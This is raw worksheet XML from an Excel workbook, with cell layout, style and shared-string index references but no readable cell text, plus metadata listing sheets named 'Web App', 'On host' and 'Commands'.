        <v>8</v>
      </c>
      <c r="E1" s="4" t="s">
        <v>5</v>
      </c>
      <c r="F1" s="4" t="s">
        <v>21</v>
      </c>
      <c r="G1" s="4" t="s">
        <v>10</v>
      </c>
      <c r="H1" s="4" t="s">
        <v>9</v>
      </c>
    </row>
    <row r="2" spans="1:8" s="4" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A2" s="1" t="s">
        <v>65</v>
      </c>
      <c r="B2" s="2"/>
      <c r="C2" s="2"/>
      <c r="D2" s="2" t="s">
        <v>66</v>
      </c>
      <c r="E2" s="2"/>
      <c r="F2" s="2"/>
    </row>
    <row r="3" spans="1:8" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A3" s="1" t="s">
        <v>65</v>
      </c>
      <c r="D3" s="2" t="s">
        <v>67</v>
      </c>
      <c r="G3" s="5"/>
    </row>
    <row r="4" spans="1:8" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A4" s="1" t="s">
        <v>65</v>
      </c>
      <c r="D4" s="2" t="s">
        <v>68</v>
      </c>
      <c r="E4" s="2" t="s">
        <v>71</v>
      </c>
      <c r="F4" s="2" t="s">
        <v>72</v>
      </c>
    </row>
    <row r="5" spans="1:8" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A5" s="1" t="s">
        <v>65</v>
      </c>
      <c r="D5" s="2" t="s">
        <v>69</v>
      </c>
      <c r="E5" s="1"/>
    </row>
    <row r="6" spans="1:8" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A6" s="1" t="s">
        <v>65</v>
      </c>
      <c r="D6" s="2" t="s">
        <v>70</v>
      </c>
      <c r="E6" s="1"/>
      <c r="F6" s="4"/>
    </row>
    <row r="8" spans="1:8" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="D8" s="4"/>
    </row>
    <row r="9" spans="1:8" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="D9" s="4"/>
    </row>
    <row r="10" spans="1:8" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="D10" s="4"/>
      <c r="F10" s="5"/>
    </row>
    <row r="11" spans="1:8" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="D11" s="4"/>
    </row>
    <row r="12" spans="1:8" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="D12" s="4"/>
    </row>
    <row r="13" spans="1:8" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="D13" s="4"/>
    </row>
    <row r="14" spans="1:8" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="D14" s="4"/>
    </row>
    <row r="15" spans="1:8" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="D15" s="4"/>
    </row>
    <row r="24" spans="7:7" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="G24" s="5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3C73-22A5-4008-8739-F489AE5D585F}">
  <dimension ref="A1:K4"/>
  <sheetViews>
    <sheetView zoomScale="72" zoomScaleNormal="72" workbookViewId="0">
      <pane ySplit="1" topLeftCell="A2" activePane="bottomLeft" state="frozen"/>
      <selection activeCell="B1" sqref="B1"/>
      <selection pane="bottomLeft" sqref="A1:XFD1"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultColWidth="15.77734375" defaultRowHeight="15" customHeight="1" x14ac:dyDescent="0.3"/>
  <cols>
    <col min="1" max="9" width="15.77734375" style="2"/>
    <col min="10" max="10" width="55.88671875" style="2" customWidth="1"/>
    <col min="11" max="11" width="31.77734375" style="2" customWidth="1"/>
    <col min="12" max="16384" width="15.77734375" style="2"/>
  </cols>
  <sheetData>
    <row r="1" spans="1:11" s="4" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A1" s="4" t="s">
        <v>11</v>
      </c>
      <c r="B1" s="4" t="s">
        <v>4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5</v>
      </c>
      <c r="I1" s="4" t="s">
        <v>10</v>
      </c>
      <c r="J1" s="3" t="s">
        <v>21</v>
      </c>
      <c r="K1" s="4" t="s">
        <v>9</v>
      </c>
    </row>
    <row r="2" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A2" s="1" t="s">
        <v>93</v>
      </c>
      <c r="E2" s="2" t="s">
        <v>81</v>
      </c>
      <c r="H2" s="2" t="s">
        <v>91</v>
      </c>
      <c r="I2" s="5"/>
      <c r="J2" s="2" t="s">
        <v>90</v>
      </c>
    </row>
    <row r="3" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A3" s="1"/>
      <c r="E3" s="1"/>
      <c r="I3" s="5"/>
    </row>
    <row r="4" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A4" s="1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388-0D5B-4574-B9C5-0C945BA9368E}">
  <dimension ref="A1:A36"/>
  <sheetViews>
    <sheetView zoomScale="80" zoomScaleNormal="80" workbookViewId="0">
      <selection activeCell="A38" sqref="A38"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" customHeight="1" x14ac:dyDescent="0.3"/>
  <cols>
    <col min="1" max="1" width="175" style="6" bestFit="1" customWidth="1"/>
    <col min="2" max="16384" width="8.88671875" style="2"/>
  </cols>
  <sheetData>
    <row r="1" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A1" s="4" t="s">
        <v>6</v>
      </c>
    </row>
    <row r="2" spans="1:1" s="9" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A2" s="9" t="s">
        <v>95</v>
      </c>
    </row>
    <row r="3" spans="1:1" s="9" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A3" s="9" t="s">
        <v>96</v>
      </c>
    </row>
    <row r="4" spans="1:1" s="9" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A4" s="6" t="s">
        <v>20</v>
      </c>
    </row>
    <row r="5" spans="1:1" s="9" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A5" s="6" t="s">
        <v>19</v>
      </c>
    </row>
    <row r="6" spans="1:1" s="9" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A6" s="6" t="s">
        <v>97</v>
      </c>
    </row>
    <row r="7" spans="1:1" s="9" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A7" s="6" t="s">
        <v>23</v>
      </c>
    </row>
    <row r="8" spans="1:1" s="9" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A8" s="6" t="s">
        <v>98</v>
      </c>
    </row>
    <row r="9" spans="1:1" s="9" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A9" s="6" t="s">
        <v>99</v>
      </c>
    </row>
    <row r="10" spans="1:1" s="9" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A10" s="6" t="s">
        <v>62</v>
      </c>
    </row>
    <row r="11" spans="1:1" s="9" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A11" s="6" t="s">
        <v>64</v>
      </c>
    </row>
    <row r="12" spans="1:1" s="9" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A12" s="6" t="s">
        <v>74</v>
      </c>
    </row>
    <row r="13" spans="1:1" s="9" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A13" s="6" t="s">
        <v>100</v>
      </c>
    </row>
    <row r="14" spans="1:1" s="9" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A14" s="6" t="s">
        <v>75</v>
      </c>
    </row>
    <row r="15" spans="1:1" s="9" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A15" s="6" t="s">
        <v>101</v>
      </c>
    </row>
    <row r="16" spans="1:1" s="9" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A16" s="6" t="s">
        <v>102</v>
      </c>
    </row>
    <row r="17" spans="1:1" s="9" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A17" s="6" t="s">
        <v>103</v>
      </c>
    </row>
    <row r="18" spans="1:1" s="9" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A18" s="6" t="s">
        <v>77</v>
      </c>
    </row>
    <row r="19" spans="1:1" s="9" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A19" s="6" t="s">
        <v>104</v>
      </c>
    </row>
    <row r="20" spans="1:1" s="9" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A20" s="6" t="s">
        <v>78</v>
      </c>
    </row>
    <row r="21" spans="1:1" s="9" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A21" s="6" t="s">
        <v>105</v>
      </c>
    </row>
    <row r="22" spans="1:1" s="9" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A22" s="6" t="s">
        <v>79</v>
      </c>
    </row>
    <row r="23" spans="1:1" s="9" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A23" s="6" t="s">
        <v>94</v>
      </c>
    </row>
    <row r="24" spans="1:1" s="9" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A24" s="6" t="s">
        <v>111</v>
      </c>
    </row>
    <row r="25" spans="1:1" s="9" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A25" s="6" t="s">
        <v>106</v>
      </c>
    </row>
    <row r="26" spans="1:1" s="9" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A26" s="6" t="s">
        <v>84</v>
      </c>
    </row>
    <row r="27" spans="1:1" s="9" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A27" s="6" t="s">
        <v>85</v>
      </c>
    </row>
    <row r="28" spans="1:1" s="9" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A28" s="6" t="s">
        <v>86</v>
      </c>
    </row>
    <row r="29" spans="1:1" s="9" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A29" s="6" t="s">
        <v>87</v>
      </c>
    </row>
    <row r="30" spans="1:1" s="9" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A30" s="6" t="s">
        <v>88</v>
      </c>
    </row>
    <row r="31" spans="1:1" s="9" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A31" s="6" t="s">
        <v>89</v>
      </c>
    </row>
    <row r="32" spans="1:1" s="9" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A32" s="6" t="s">
        <v>107</v>
      </c>
    </row>
    <row r="33" spans="1:1" s="9" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A33" s="6" t="s">
        <v>108</v>
      </c>
    </row>
    <row r="34" spans="1:1" s="9" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A34" s="6" t="s">
        <v>109</v>
      </c>
    </row>
    <row r="35" spans="1:1" s="9" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A35" s="6" t="s">
        <v>110</v>
      </c>
    </row>
    <row r="36" spans="1:1" s="9" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A36" s="6" t="s">
        <v>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AFEE-C3BA-4A05-9783-1ED877C22A62}">
  <dimension ref="A1:A2"/>
  <sheetViews>
    <sheetView workbookViewId="0">
      <selection activeCell="A28" sqref="A28"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" customHeight="1" x14ac:dyDescent="0.3"/>
  <cols>
    <col min="1" max="1" width="80.88671875" style="2" bestFit="1" customWidth="1"/>
    <col min="2" max="16384" width="8.88671875" style="2"/>
  </cols>
  <sheetData>
    <row r="1" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A1" s="4" t="s">
        <v>22</v>
      </c>
    </row>
    <row r="2" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A2" s="5" t="s">
        <v>83</v>
      </c>
    </row>
  </sheetData>
  <hyperlinks>
    <hyperlink ref="A2" r:id="rId1" xr:uid="{1428049B-019D-4248-B66B-25C03753A88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</vt:lpstr>
      <vt:lpstr>Web App</vt:lpstr>
      <vt:lpstr>On host</vt:lpstr>
      <vt:lpstr>Commands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2026-06-23T12:52:04Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-07-01T12:19:24Z</dcterms:modified>
</cp:coreProperties>
</file>